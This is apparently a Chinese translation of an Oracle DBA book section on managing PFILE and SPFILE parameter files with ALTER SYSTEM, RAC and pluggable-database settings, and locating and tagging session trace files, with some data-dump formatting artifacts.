  \n你可以通过以下两种方式之一设置各种参数值：仅用于当前实例，或是持久设置。确保参数文件包含你想要的值是你的责任。当使用传统的 `init.ora` 参数文件时，这是一个手动过程。要持久地更改参数值，使新设置在服务器重启后依然有效，你必须手动编辑和修改\
  \ `init.ora` 参数文件。而对于服务器参数文件，你会发现通过一条命令，这一切或多或少已经为你实现了自动化。\n\n## 旧版 init.ora 参数文件\n\
  \n旧版的 `init.ora` 文件在结构上非常简单。它是一系列的变量键/值对。一个示例的 `init.ora` 文件可能如下所示：\n\n```\ncontrol_files='/opt/oracle/oradata/CDB/control01.ctl'\n\
  db_block_size=8192\ndb_name='CDB'\n```\n\n事实上，这已经非常接近现实中你能使用的最基本的 `init.ora` 文件了，不过，如果我使用的块大小是我的平台上的默认值（默认块大小因平台而异），我就可以移除那个参数。参数文件至少用于获取数据库名称和控制文件的位置。控制文件告知\
  \ Oracle 其他每个文件的位置，因此对于启动实例的“引导”过程至关重要。\n\n现在你了解了这些旧版数据库参数文件是什么，以及去哪里获取有关可设置有效参数的更多细节，你还需要知道在磁盘上的什么位置可以找到它们。该文件的默认命名约定是\n\
  \n```\ninit$ORACLE_SID.ora    (UNIX/Linux 环境变量)\ninit%ORACLE_SID%.ora   (Windows\
  \ 环境变量)\n```\n\n并且默认会在以下位置找到：\n\n```\n$ORACLE_HOME/dbs       (UNIX/Linux)\n%ORACLE_HOME%\\\
  DATABASE (Windows)\n```\n\n有趣的是，在许多情况下，你会发现这个参数文件的完整内容是这样的：\n\n```\nIFILE= /some/path/to/somewhere/init.ora'\n\
  ```\n\n`IFILE` 指令的工作方式类似于 C 语言中的 `#include file`。它将指定文件的内容包含到当前文件中。在这里，这个指令包含了一个来自非默认位置的\
  \ `init.ora` 文件。\n\n应该指出的是，参数文件不必位于任何特定位置。启动实例时，你可以在启动命令中使用 `pfile=filename` 选项。当你想在你的数据库上尝试不同的\
  \ `init.ora` 参数以查看不同设置的效果时，这非常有用。\n\n旧版参数文件可以通过任何文本编辑器进行维护。例如，在 UNIX/Linux 上，我会使用\
  \ `vi`；在众多 Windows 操作系统版本上，我会使用 `Notepad`；而在大型机上，我可能会使用 `Xedit`。重要的是要注意，你完全负责编辑和维护此文件。Oracle\
  \ 数据库本身没有任何命令可用于维护 `init.ora` 文件中的值。例如，当你使用 `init.ora` 参数文件时，发出 `ALTER SYSTEM` 命令来更改\
  \ SGA 组件的大小，这不会在该文件中体现为永久更改。如果你想使该更改永久生效——换句话说，如果你希望它成为后续数据库重启的默认值——那么你需要确保手动更新所有可能用于启动此数据库的\
  \ `init.ora` 参数文件。\n\n最后一个值得注意的有趣点是，旧版参数文件不一定位于数据库服务器上。引入服务器参数文件（我们稍后讨论）的原因之一就是为了弥补这种情况。旧版参数文件必须存在于尝试启动数据库的客户端机器上，这意味着如果你运行的是\
  \ UNIX/Linux 服务器，但通过在你的 Windows 桌面机器上安装的 `SQL*Plus` 通过网络进行管理，那么你需要在桌面上有该数据库的参数文件。\n\
  \n我仍然记得我是如何痛苦地发现参数文件并不存储在服务器上的。那是很多年前，当时引入了一个全新的（现已退役）名为 `SQL*DBA` 的工具。这个工具允许我们执行远程操作，特别是远程管理操作。我从我的服务器（当时运行\
  \ SunOS）能够远程连接到一台大型机数据库服务器。我也能够发出关闭命令。然而，就在那时我意识到我有点陷入困境——当我试图启动实例时，`SQL*DBA` 会抱怨找不到参数文件。我了解到这些参数文件——即\
  \ `init.ora` 纯文本文件——位于带有客户端的机器上；它们必须存在于*客户端*机器上——而*不是*在服务器上。`SQL*DBA` 在我的本地系统上寻找参数文件来启动大型机数据库。我不仅没有任何这样的文件，而且我也不知道要在文件里放些什么才能让系统重新启动！我不知道\
  \ `db_name` 或控制文件位置（即使只是弄清楚大型机文件的正确命名约定都有点困难），而且我也无法登录到大型机系统本身。从那以后我再也没有犯过同样的错误；这是一个痛苦的教训。\n\
  \n当 DBA 意识到 `init.ora` 参数文件必须驻留在启动数据库的客户端机器上时，导致了这些文件的激增。每个 DBA 都想从他们的桌面运行管理工具，因此每个\
  \ DBA 都需要在他们的桌面机器上有一份参数文件副本。像 Oracle Enterprise Manager (`OEM`) 这样的工具会增加又一个参数文件。这些工具试图在一台单一的机器上集中管理企业中的所有数据库，这台机器有时被称为*管理服务器*。这台单一机器将运行所有\
  \ DBA 用来启动、关闭、备份和以其他方式管理数据库的软件。这听起来是一个完美的解决方案：将所有参数文件集中在一个位置，并使用 GUI 工具执行所有操作。但现实情况是，有时在执行某些管理任务期间，直接从数据库服务器机器上的\
  \ `SQL*Plus` 发出管理启动命令要方便得多，因此我们最终又有了多个参数文件：一个在管理服务器上，一个在数据库服务器上。这些参数文件随后会彼此不同步，人们会纳闷为什么他们上个月做的参数更改可能会“消失”，然后以看似随机的方式重新出现。\n\
  \n于是引入了服务器参数文件（`SPFILE`），它现在可以成为数据库的唯一真实来源。\n\n## 服务器参数文件 (SPFILE)\n\n`SPFILE` 代表了\
  \ Oracle 访问和维护实例参数设置方式的根本性改变。`SPFILE` 消除了与旧版参数文件相关的两个严重问题：\n\n*   *它阻止了参数文件的激增：*\
  \ `SPFILE` 总是存储在数据库服务器上；`SPFILE` 必须存在于服务器机器本身，不能位于客户端机器上。这使得在参数设置方面拥有一个单一的“事实来源”变得切实可行。\n\
  *   *它消除了（实际上，它移除了能力）在数据库外部使用文本编辑器手动维护参数文件的需要：* `ALTER SYSTEM` 命令允许你将值直接写入 `SPFILE`。管理员不再需要手动查找和维护所有参数文件。\n\
  \n该文件的默认命名约定是\n\n```\n$ORACLE_HOME/dbs/spfile$ORACLE_SID.ora    (UNIX/Linux 环境变量)\n\
  %ORACLE_HOME/database/spfile%ORACLE_SID%.ora   (Windows 环境变量)\n```\n\n我强烈建议使用默认位置；否则就违背了\
  \ `SPFILE` 所代表的简洁性。当 `SPFILE` 位于其默认位置时，一切或多或少都是为你自动完成的。将 `SPFILE` 移动到非默认位置意味着你必须告诉\
  \ Oracle 在哪里找到 `SPFILE`，这又会导致旧版参数文件的所有原始问题重现！\n\n**注意**\n\n在 Oracle RAC 环境中，spfile\
  \ 通常位于共享 ASM 磁盘上的目录中，例如 `+DATA/<dbname>/PARAMETERFILE`。你可以通过 `SRVCTL` 实用程序查看位置。\n\
  \n\n### 转换为 SP 文件\n\n假设你有一个正在使用传统参数文件的数据库。迁移到 `SP 文件` 相当简单——你只需使用 `CREATE SPFILE`\
  \ 命令。\n\n注意：你也可以使用“反向”命令从 `SP 文件` 创建一个参数文件 (`PFILE`)。稍后我会解释为什么你可能需要这样做。\n\n因此，假设你有一个\
  \ `init.ora` 参数文件，并且该文件位于服务器的默认位置，你只需执行 `CREATE SPFILE` 命令并重启服务器实例。你需要以特权账户连接到根容器才能执行此任务：\n\
  \n```sql\n$ sqlplus / as sysdba\nSQL> show parameter spfile;\nNAME             \
  \                    TYPE        VALUE\n------------------------------------ -----------\
  \ -------\nspfile                               string\nSQL> create spfile from\
  \ pfile;\nFile created.\nSQL> startup force;\nORACLE instance started.\nDatabase\
  \ mounted.\nDatabase opened.\nSQL> show parameter spfile;\nNAME                \
  \                 TYPE        VALUE\n------------------------------------ -----------\
  \ --------------------------\nspfile                               string      /opt/oracle/product/21c/dbhome_1/dbs/spfileCDB.ora\n\
  ```\n\n回顾一下，我们在这里使用 `SHOW PARAMETER` 命令是为了表明最初我们没有使用 `SP 文件`，但在我们创建了一个并重启实例后，我们就在使用它了，并且它具有默认名称。\n\
  \n注意：在集群环境（使用 Oracle RAC）中，所有实例共享同一个 `SP 文件`，因此将 `P 文件` 转换为 `SP 文件` 的过程应该以受控的方式进行。单个\
  \ `SP 文件` 可以包含所有参数设置，甚至是实例特定的设置，但你必须使用如下格式将所有必要的参数文件合并为一个 `P 文件`。\n\n在 RAC 环境中，为了从单个\
  \ `P 文件` 转换为所有实例共享的 `SP 文件`，你需要将你的单个 `P 文件` 合并为一个如下所示的单一文件：\n\n```text\n*.cluster_database=true\n\
  *.control_files='+DATA/CDB/CONTROLFILE/current.261.1064287219','+RECO/CDB/CONTROLFILE/current.256.1064287219'\n\
  *.db_block_size=8192\n*.db_create_file_dest='+DATA'\n*.db_name='cdb'\n*.db_recovery_file_dest='+RECO'\n\
  *.db_recovery_file_dest_size=12207m\n*.diagnostic_dest='/u01/app/oracle'\n*.dispatchers='(PROTOCOL=TCP)\
  \ (SERVICE=cdbXDB)'\n*.enable_pluggable_database=true\ncdb1.instance_number=1\n\
  cdb2.instance_number=2\n*.local_listener='-oraagent-dummy-'\n*.nls_language='AMERICAN'\n\
  *.nls_territory='AMERICA'\n*.pga_aggregate_target=256m\n*.remote_login_passwordfile='exclusive'\n\
  *.sga_target=2000m\ncdb2.thread=2\ncdb1.thread=1\ncdb1.undo_tablespace='UNDOTBS1'\n\
  cdb2.undo_tablespace='UNDOTBS2'\n```\n\n也就是说，集群中所有实例共有的参数设置将以 \"`*.`\" 字符串开头。特定于单个实例的参数设置，例如\
  \ `INSTANCE_NUMBER` 和要使用的重做日志的 `THREAD`，会以实例名（Oracle SID）作为前缀。在上面的例子中：\n\n*   这个\
  \ `P 文件` 是为一个双节点集群准备的，其实例名为 `CDB1` 和 `CDB2`。\n*   `*.db_name = 'CDB'` 这个赋值表示所有使用此\
  \ `SP 文件` 的实例都将挂载一个名为 `CDB` 的数据库。\n*   `cdb1.undo_tablespace='UNDOTBS1'` 表示名为 `CDB1`\
  \ 的实例将使用该特定的撤消表空间，依此类推。\n\n### 在 SP 文件中设置值\n\n一旦我们的数据库在 `SP 文件` 上启动并运行，下一个问题就涉及如何设置和更改其中的值。请记住，`SP\
  \ 文件` 是二进制文件，我们不能直接用文本编辑器编辑它们。答案是使用 `ALTER SYSTEM` 命令，其语法如下（<>内的部分是可选的，管道符号表示“列表中的一个”）：\n\
  \n```sql\nAlter system set parameter=value\n```\n\n默认情况下，`ALTER SYSTEM SET` 命令将更新当前运行的实例，并为你更改\
  \ `SP 文件`——或者在可插拔数据库的情况下，更改该可插拔数据库的数据字典（有关可插拔数据库的更多信息，请参见下一节）。这极大地简化了管理，并消除了当使用\
  \ `ALTER SYSTEM` 添加或修改参数设置，却忘记更新或漏掉 `init.ora` 参数文件时出现的问题。\n\n让我们看一下该命令的每个元素：\n\n\
  *   `parameter=value` 赋值提供了参数名和该参数的新值。例如，`pga_aggregate_target = 1024m` 会将 `pga_aggregate_target`\
  \ 参数设置为 1024MB（1GB）。\n*   `comment='text'` 是一个可选的注释，你可以将其与此参数的此次设置关联起来。该注释将出现在 `V$PARAMETER`\
  \ 视图的 `UPDATE_COMMENT` 字段中。如果你使用了将更改保存到 `SP 文件` 的选项，该注释也会被写入 `SP 文件`，并在服务器重启后得以保留，因此数据库未来的重启时也能看到该注释。\n\
  *   `deferred` 指定系统更改是仅对后续会话生效（不包括当前已建立的会话，包括进行更改的会话）。默认情况下，`ALTER SYSTEM` 命令会立即生效，但有些参数不能立即更改——它们只能为新建立的会话更改。我们可以使用以下查询来查看哪些参数强制要求使用\
  \ `deferred`：\n\n```sql\nSQL> select name from v$parameter where issys_modifiable='DEFERRED';\n\
  NAME\n--------------------------------\nbackup_tape_io_slaves\nrecyclebin\nsession_cached_cursors\n\
  private_temp_table_prefix\naudit_file_dest\nobject_cache_optimal_size\nobject_cache_max_size_percent\n\
  sort_area_size\nsort_area_retained_size\nclient_statistics_level\nolap_page_pool_size\n\
  ```\n\n注意：你的结果可能不同；从版本到版本，哪些参数可以在线设置——但必须延迟设置——列表可能会也确实会改变。\n\n代码显示 `SORT_AREA_SIZE`\
  \ 可以在系统级别修改，但只能以延迟的方式进行。以下代码展示了如果我们尝试使用和不使用 `deferred` 选项来修改其值会发生什么：\n\n*   `SCOPE=MEMORY|SPFILE|BOTH`\
  \ 指示了此参数设置的“范围”。以下是我们设置参数值时的选择：\n    *   `SCOPE=MEMORY` 仅在实例中更改设置；它不会在数据库重启后保留。下次启动数据库时，设置将是已记录在\
  \ `SP 文件` 中的值。\n    *   `SCOPE=SPFILE` 仅在 `SP 文件` 中更改值。直到数据库重启并再次处理 `SP 文件` 后，更改才会生效。有些参数只能通过此选项更改。例如，`processes`\
  \ 参数必须使用 `SCOPE=SPFILE`，因为你无法更改活动实例的值。\n    *   `SCOPE=BOTH` 表示参数更改同时在内存和 `SP 文件`\
  \ 中生效。更改将反映在当前实例中，并且下次启动时，此更改仍然有效。这是使用 `SP 文件` 时 `SCOPE` 的默认值。对于 `init.ora` 参数文件，默认且唯一有效的值是\
  \ `SCOPE=MEMORY`。如果实例是使用 `SP 文件` 启动的，这就是默认值。\n\n\n"
- "# Oracle SPFILE 与 PFILE 管理\n\n## 参数设置\n\n-   `sid='sid|*'` 主要用于集群环境；默认值为 `sid='*'`。此设置允许您为集群中的任何给定实例唯一指定参数设置。除非您正在使用\
  \ Oracle RAC，否则无需指定 `sid=` 设置。\n\n-   `container=current|all` 用于多租户数据库中，以确定变更的范围。如果\
  \ `ALTER SYSTEM` 是在根容器数据库中执行的，通过使用 `all` 选项，该设置可以向下传播到每个可插拔数据库。否则，默认情况下，只有当前的容器或可插拔数据库会受到变更的影响。请注意，特定于可插拔数据库的设置不会记录在\
  \ `SPFILE` 中，而是存储在可插拔数据库的数据字典中，以便当它移动到另一个容器时，其特定设置会随之移动。\n\n## ALTER SYSTEM 命令示例\n\
  \n以下命令演示了直接设置可能失败的情况以及使用 `deferred` 选项的成功设置。\n\n```\nSQL> alter system set sort_area_size\
  \ = 65536;\nalter system set sort_area_size = 65536\n*\nERROR at line 1:\nORA-02096:\
  \ specified initialization parameter is not modifiable with this option\nSQL> alter\
  \ system set sort_area_size = 65536 deferred;\nSystem altered.\n```\n\n一个典型的用法可能是：\n\
  \n```\nSQL> alter system set pga_aggregate_target=512m;\nSystem altered.\n```\n\n\
  > **注意**\n>\n> 前面的命令——实际上本书中的许多 `ALTER SYSTEM` 命令——在您的系统上可能会失败。如果您使用了与我的示例不兼容的其他设置（例如，其他内存参数），您很可能会收到错误。这并不意味着命令不起作用，而是您尝试使用的设置与您的整体配置不兼容。\n\
  \n更好的做法，或许是使用 `COMMENT=` 赋值来记录何时以及/或为何进行了特定更改：\n\n```\nSQL> alter system set pga_aggregate_target=512m\
  \  comment = 'AWR recommendation';\nSystem altered.\nSQL> select value, update_comment\
  \  from v$parameter  where name = 'pga_aggregate_target';\nVALUE               \
  \ UPDATE_COMMENT\n-------------------- ----------------------------------------\n\
  536870912            AWR recommendation\n```\n\n## 取消 SPFILE 中的值设置\n\n接下来的问题是，如何取消我们之前设置的值？换句话说，我们不再希望该参数设置出现在我们的\
  \ `SPFILE` 中。既然我们不能使用文本编辑器编辑该文件，该如何完成？这同样通过 `ALTER SYSTEM` 命令完成，但使用 `RESET` 子句：\n\
  \n```\nAlter system reset parameter  sid='sid|*'\n```\n\n例如，如果我们想要移除 `sort_area_size`\
  \ 参数，以使其采用我们之前指定的默认值，可以按如下方式操作：\n\n```\nSQL> alter system reset sort_area_size scope=spfile\
  \ ;\nSystem altered.\n```\n\n`sort_area_size` 从 `SPFILE` 中被移除，您可以通过执行以下命令来验证：\n\n\
  ```\nSQL> create pfile='/tmp/pfile.tst' from spfile;\nFile created.\n```\n\n然后，您可以查看\
  \ `/tmp/pfile.tst` 的内容，该文件将在数据库服务器上生成。您会发现 `sort_area_size` 参数不再存在于参数文件中。\n\n##\
  \ 从 SPFILE 创建 PFILE\n\n我们刚刚看到的 `CREATE PFILE...FROM SPFILE` 命令与 `CREATE SPFILE`\
  \ 相反。它获取二进制的 `SPFILE` 并从中创建一个纯文本文件——该文件可以在任何文本编辑器中编辑，并随后用于启动数据库。您可能会经常使用此命令做至少两件事：\n\
  \n-   创建一个带有特殊设置的临时参数文件，以启动数据库进行维护。因此，您会执行 `CREATE PFILE...FROM SPFILE` 并编辑生成的文本\
  \ `PFILE`，修改所需的设置。然后，您将使用 `PFILE=<FILENAME>` 选项启动数据库，以指定您的 `PFILE` 而不是 `SPFILE`。完成后，只需在不指定\
  \ `PFILE=<FILENAME>` 的情况下正常启动，数据库就会使用 `SPFILE`。\n\n-   维护带注释的变更历史记录。过去，许多数据库管理员会在其参数文件中大量注释变更历史。例如，如果他们更改了\
  \ SGA 大小 20 次，那么在 `sga_target init.ora` 参数设置前会有 20 条注释，说明进行更改的日期和原因。`SPFILE` 不支持此功能，但如果您养成以下习惯，可以实现相同的效果：\n\
  \n    ```\n    SQL> connect / as sysdba\n    Connected.\n    SQL> create pfile='init_10_feb_2021_CDB.ora'\
  \ from spfile;\n    File created.\n    SQL> alter system set pga_aggregate_target=512m\
  \ comment = 'Changed 10-feb-2021, AWR recommendation';\n    System altered.\n  \
  \  ```\n\n通过这种方式，您的历史记录将保存在随时间推移的一系列参数文件中。\n\n## 修复损坏的 SPFILE\n\n关于 `SPFILEs` 的最后一个问题是：“`SPFILEs`\
  \ 是二进制文件，那么如果一个损坏了导致数据库无法启动怎么办？至少 `init.ora` 文件只是文本，我们可以编辑并修复它。” 嗯，`SPFILEs` 不应该比数据文件、重做日志文件、控制文件等更容易损坏。然而，如果发生这种情况——或者如果您在\
  \ `SPFILE` 中设置了一个不允许数据库启动的值——您有几个选择。\n\n首先，`SPFILE` 中的二进制数据量非常小。如果您在 UNIX/Linux\
  \ 平台上，一个简单的 `strings` 命令将提取出您的所有设置：\n\n```\n$ strings $ORACLE_HOME/dbs/spfile$ORACLE_SID.ora\n\
  *.audit_sys_operations=false\n*.audit_trail='none'\n*.commit_logging='batch'\n*.commit_wait='nowait'...\n\
  ```\n\n在 Windows 上，只需使用 `write.exe`（写字板）打开该文件。写字板将显示文件中的所有清晰文本，通过简单地复制并粘贴到 `init<ORACLE_SID>.ora`\
  \ 中，您可以创建一个 `PFILE` 用来启动您的实例。\n\n如果 `SPFILE` 刚好“丢失”（无论什么原因——虽然我还没见过 `SPFILE` 消失），您还可以从数据库的警报日志中恢复参数文件的信息（稍后会详细介绍警报日志）。每次启动数据库时，警报日志都会包含一个类似以下的部分：\n\
  \n```\nSystem parameters with non-default values:\nprocesses                = 300\n\
  nls_language             = \"AMERICAN\"\nnls_territory            = \"AMERICA\"\n\
  filesystemio_options     = \"setall\"\nsga_target               = 2152M\ncontrol_files\
  \            = \"/opt/oracle/oradata/CDB/control01.ctl”\ndb_block_size         \
  \   = 8192\n...\n\n```\n\n从这部分，您可以轻松创建一个 `PFILE`，然后使用 `CREATE SPFILE` 命令将其转换为新的\
  \ `SPFILE`。\n\n### 可插拔数据库\n\n可插拔数据库被设计为一组可以移动的文件，能够从一个根容器数据库转移到另一个。也就是说，我们可以拔出一个可插拔数据库，然后将其插回到同一个根容器数据库或其他根容器数据库中，从而恢复我们原始的可插拔数据库——包括所有应用模式、用户、元数据、权限、数据，甚至我们的可插拔数据库参数设置（那些非从根容器继承的设置）。这是通过将可插拔数据库特定的参数设置存储在数据字典表\
  \ `SYS.PDB_SPFILE$` 中来实现的。你可以通过以下查询查看在 PDB 级别可修改的参数：\n\n```sql\nSQL> SELECT name,\
  \ value\nFROM   v$system_parameter\nWHERE  ispdb_modifiable = 'TRUE'\nORDER BY name;\n\
  NAME                           VALUE\n------------------------------ ------------------------------\n\
  adg_account_info_tracking\nallow_deprecated_rpcs\nallow_rowid_column_type\napprox_for_aggregation\n\
  approx_for_count_distinct\napprox_for_percentile\naq_tm_processes\nasm_diskstring\n\
  auto_start_pdb_services\nawr_pdb_autoflush_enabled\nbitmap_merge_area_size\nblank_trimming\n\
  blockchain_table_max_no_drop\n...\n```\n\n你可以通过使用 `ALTER SYSTEM ... CONTAINER` 子句或者连接到可插拔数据库并发出\
  \ `ALTER SYSTEM` 命令来设置 PDB 级别的参数：\n\n```bash\n$ sqlplus / as sysdba\nSQL> alter\
  \ session set container=pdb1;\nSQL> alter system set statistics_level=all;\n```\n\
  \n正是通过这种方式，可插拔数据库可以覆盖 `SPFILE` 中某些参数的设置，并使这些参数设置在它们从根容器数据库移动到另一个根容器数据库时随之迁移。\n\n\
  ### 参数文件总结\n\n在本节中，我们涵盖了管理 Oracle 初始化参数和参数文件的基础知识。我们研究了如何设置参数、查看参数值，以及如何让这些设置在数据库重启后持久化。我们探讨了两种类型的数据库参数文件：传统的\
  \ `PFILEs`（简单文本文件）和较新的 `SPFILEs`。对于所有现有数据库，推荐使用 `SPFILEs`，因为它们带来了管理的简便性和清晰度。拥有数据库参数的单一真实来源，以及\
  \ `ALTER SYSTEM` 命令能够持久化参数值的能力，使得 `SPFILEs` 成为一个极具吸引力的特性。我从它们一可用就开始使用，并且再也没有回头。\n\
  \n## 跟踪文件\n\n跟踪文件是调试信息的来源。当服务器遇到问题时，它会生成一个充满诊断信息的跟踪文件。当开发者执行 `DBMS_MONITOR.SESSION_TRACE_ENABLE`\
  \ 时，服务器会生成一个充满性能相关信息的跟踪文件。跟踪文件之所以对我们可用，是因为 Oracle 是一款经过大量检测的软件。所谓“检测”，我指的是编写数据库内核的程序员在其中放入了调试代码——而且是非常多的代码。他们是故意把它保留下来的。\n\
  \n我遇到过许多开发者，他们认为调试代码是开销——在应用程序投入生产之前必须被删除，以期徒劳地榨取代码的每一分性能。当然，后来他们发现自己的代码有错误，或者运行得没有预期的快（最终用户也往往把这称为错误；对最终用户来说，性能差*就是*一个错误）。那时，他们真心希望调试代码仍然在代码中（或者如果从未有过，那真希望曾经有过），特别是因为你不能在生产系统上随意添加调试代码。你必须在将新代码放入生产环境之前进行测试，而这并非能一蹴而就的事情。\n\
  \nOracle 数据库（以及应用服务器、Oracle 应用程序和各种工具，如 Application Express (APEX)）是经过大量检测的。数据库中这种检测的迹象包括：\n\
  \n*   `V$` 视图：大多数 `V$` 视图包含“调试”信息。`V$WAITSTAT`、`V$SESSION_EVENT` 以及其他许多视图的存在，仅仅是为了让我们了解内核深处发生的情况。\n\
  *   `AUDIT` 命令：此命令允许你指定数据库应记录哪些事件以供后续分析。\n*   资源管理器 (`DBMS_RESOURCE_MANAGER`)：此功能让你能在数据库内微观管理资源（CPU、I/O\
  \ 等）。使得数据库中的资源管理器成为可能的原因是，它有权访问描述资源使用情况的所有运行时统计信息。\n*   Oracle 事件：这些事件使你能够要求 Oracle\
  \ 在需要时产生跟踪或诊断信息。\n*   `DBMS_TRACE`：此工具在 PL/SQL 引擎内详尽地记录存储过程的调用树、引发的异常以及遇到的错误。\n\
  *   数据库事件触发器：这些触发器，例如 `ON SERVERERROR`，允许你监控和记录任何你认为是“异常”或超出常规的条件。例如，你可以记录当“临时空间不足”错误发生时正在运行的\
  \ SQL。\n*   `DBMS_MONITOR`：此工具用于查看运行应用程序生成的精确 SQL、等待事件以及其他与性能/行为相关的诊断信息。SQL 跟踪功能也可以通过\
  \ 10046 Oracle 事件以扩展方式使用。\n\n检测在应用程序设计和开发中至关重要，并且 Oracle 数据库在每个版本中都变得检测得更好。Oracle\
  \ 10g 通过引入自动工作负载存储库 (AWR) 和活动会话历史 (ASH) 功能，将内核中的代码检测提升到了一个全新的水平。Oracle 11g 通过诸如自动诊断存储库\
  \ (ADR) 和 SQL 性能分析器 (SPA) 等选项更进一步。Oracle 12c 则通过添加 DDL 日志来跟踪数据库中的所有 DDL 操作（这在许多典型的生产数据库日常中不应该发生），以及调试日志来跟踪数据库中的异常状况，从而更进一步。\n\
  \n在本节中，我们将重点讨论你可以在各种类型的跟踪文件中找到的信息。我们将涵盖它们是什么、存储在哪里以及我们能用它们做什么。\n\n跟踪文件有两种一般类型，我们对每种类型的做法截然不同：\n\
  \n*   **你预期并想要的跟踪文件**：例如，这是启用 `DBMS_MONITOR.SESSION_TRACE_ENABLE` 的结果。它们包含关于你会话的诊断信息，将帮助你调整应用程序以优化其性能并诊断它所遇到的任何瓶颈。\n\
  *   **你未预料到但服务器因 ORA-00600“内部错误”、ORA-03113“通信通道文件结尾”或 ORA-07445“遇到异常”类型的错误而生成的跟踪文件**：这些跟踪文件包含的诊断信息对\
  \ Oracle 支持分析师最有用，除了能显示内部错误在我们应用程序中发生的位置外，对我们来说用途有限。\n\n### 请求的跟踪文件\n\n你通常预期通过启用\
  \ `DBMS_MONITOR` 或使用 10046 事件的扩展跟踪功能而生成的跟踪文件可能如下所示：\n\n```sql\nSQL> alter session\
  \ set events '10046 trace name context forever, level 12';\nSession altered.\n```\n\
  \n这些跟踪文件包含诊断和性能相关信息。它们提供了对数据库应用程序内部工作原理的宝贵见解。在正常运行的数据库中，你会比看到任何其他类型的跟踪文件更频繁地看到这些跟踪文件。\n\
  \n\n#### 文件位置\n\n无论你使用 `DBMS_MONITOR` 扩展的跟踪功能，Oracle 都会基于 `DIAGNOSTIC_DEST` 初始化参数的设置，在数据库服务器上开始生成一个跟踪文件。`DIAGNOSTIC_DEST`\
  \ 所指定的目录结构如下：\n\n```\n/diag/rdbms/<db_name>/<instance_name>/\n```\n\n此位置被称为自动诊断存储库（ADR）主目录。例如，如果数据库名是\
  \ CDB，实例名也是 CDB，那么 ADR 主目录将是 `<diagnostic_dest>/diag/rdbms/cdb/CDB`。你可以通过此查询查看目录设置：\n\
  \n```\nSQL> select name, value from v$diag_info;\nAME                 VALUE\n--------------------\
  \ ------------------------------------------------------\nDiag Enabled         TRUE\n\
  ADR Base             /opt/oracle\nADR Home             /opt/oracle/diag/rdbms/cdb/CDB\n\
  Diag Trace           /opt/oracle/diag/rdbms/cdb/CDB/trace\nDiag Alert          \
  \ /opt/oracle/diag/rdbms/cdb/CDB/alert\nDiag Incident        /opt/oracle/diag/rdbms/cdb/CDB/incident\n\
  Diag Cdump           /opt/oracle/diag/rdbms/cdb/CDB/cdump\nHealth Monitor      \
  \ /opt/oracle/diag/rdbms/cdb/CDB/hm\nDefault Trace File   /opt/oracle/diag/rdbms/cdb/CDB/trace/CDB_ora_15884.trc\n\
  ...\n```\n\n最重要的几行是：\n\n*   `Diag Trace`：这是基于文本的警报日志和跟踪文件的存放位置。\n*   `Diag Alert`：这是基于\
  \ XML 的警报日志文件的写入位置。\n\n作为 DBA，你会花很多时间处理 `Diag Trace` 目录中的文件。这些文件在调试和维护中被频繁使用，以至于\
  \ DBA 们通常会创建别名，以便直接跳转到该目录并跟踪警报日志。例如：\n\n```\n$ alias cda='cd /opt/oracle/diag/rdbms/cdb/CDB/trace'\n\
  $ alias ta='tail -f /opt/oracle/diag/rdbms/cdb/CDB/trace/alert_CDB.log'\n```\n\n\
  这些别名创建了用于处理这些关键文件的快捷方式。\n\n#### 命名约定\n\nOracle 中跟踪文件的命名约定会不时变化，但如果你有系统中的示例跟踪文件名，很容易看出使用的模板。例如，在我的各种\
  \ UNIX/Linux 服务器上，跟踪文件名通常具有以下通用格式：\n\n*   文件名的第一部分是 `ORACLE_SID`。\n*   文件名的下一部分就是\
  \ `ora`。\n*   跟踪文件名中的数字是你的专用服务器的进程 ID，可以从 `V$PROCESS` 视图中获取。\n\n```\n<ORACLE_SID>_ora_<process_id>.trc\n\
  ```\n\n跟踪文件名可以分解如下：\n\n那么，一个用于生成你的跟踪文件名的查询可能是：\n\n```\nSQL> column trace new_val\
  \ TRACE format a100\nSQL> select i.value || '/' || d.instance_name || '_ora_' ||\
  \ a.spid || '.trc' trace\nfrom v$process a, v$session b, v$diag_info i , v$instance\
  \ d\nwhere a.addr = b.paddr\nand b.audsid = userenv('sessionid')\nand i.name='Diag\
  \ Trace';\nTRACE\n\n/opt/oracle/diag/rdbms/cdb/CDB/trace/CDB_ora_16908.trc\n```\n\
  \n这仅仅表明，如果文件存在，你将能够通过该名称访问它（假设你有读取跟踪目录的权限）。以下示例生成了一个跟踪文件，展示了跟踪启用后文件是如何创建的：\n\n```\n\
  SQL> !ls &TRACE\nls: cannot access /opt/oracle/diag/rdbms/cdb/CDB/trace/CDB_ora_16908.trc:\
  \ No such file or directory\nSQL> exec dbms_monitor.session_trace_enable\nPL/SQL\
  \ procedure successfully completed.\nSQL> !ls &TRACE\n/opt/oracle/diag/rdbms/cdb/CDB/trace/CDB_ora_16908.trc\n\
  ```\n\n如你所见，在我们启用该会话的跟踪之前，文件不存在；然而，一旦启用跟踪，我们就能看到它了。\n\n如果你使用的是 Windows，显然需要将 `/`\
  \ 替换为 `\\`。\n\n#### 标记跟踪文件\n\n有一种方法可以为你的跟踪文件“打标签”，即使你没有访问 `V$PROCESS` 和 `V$SESSION`\
  \ 的权限，也能找到它。假设你有读取跟踪目录的权限，你可以使用会话参数 `tracefile_identifier`。通过它，你可以在跟踪文件名中添加一个唯一标识的字符串，例如：\n\
  \n```\nSQL> alter session set tracefile_identifier = 'Look_For_Me';\nSession altered.\n\
  SQL> !ls /opt/oracle/diag/rdbms/cdb/CDB/trace/*Look_For_Me*\nls: cannot access /opt/oracle/diag/rdbms/cdb/CDB/trace/*Look_For_Me*:\
  \ No such file or directory\nSQL> exec dbms_monitor.session_trace_enable\nPL/SQL\
  \ procedure successfully completed.\nSQL> !ls /opt/oracle/diag/rdbms/cdb/CDB/trace/*Look_For_Me*\n\
  /opt/oracle/diag/rdbms/cdb/CDB/trace/CDB_ora_15972_Look_For_Me.trc\n/opt/oracle/diag/rdbms/cdb/CDB/trace/CDB_ora_15972_Look_For_Me.trm\n\
  ```\n\n`*` 字符是一个通配符，指示 `ls` 查找文件名中包含 `Look_For_Me` 字符串的任何文件。如你所见，跟踪文件现在以标准的 `<ORACLE_SID>_ora_<PROCESS_ID>`\
  \ 格式命名，但它也关联了我们指定的唯一字符串，从而易于找到“我们”的跟踪文件名。跟踪文件以 `.trc` 为扩展名结尾。还有一个对应的跟踪映射文件（扩展名为\
  \ `.trm`），其中包含有关跟踪文件的结构信息。通常，你只对 `.trc` 文件的内容感兴趣。\n\n\n\n### 响应内部错误生成的跟踪文件\n\n我想用讨论另一种跟踪文件——那些我们没有预料到、由\
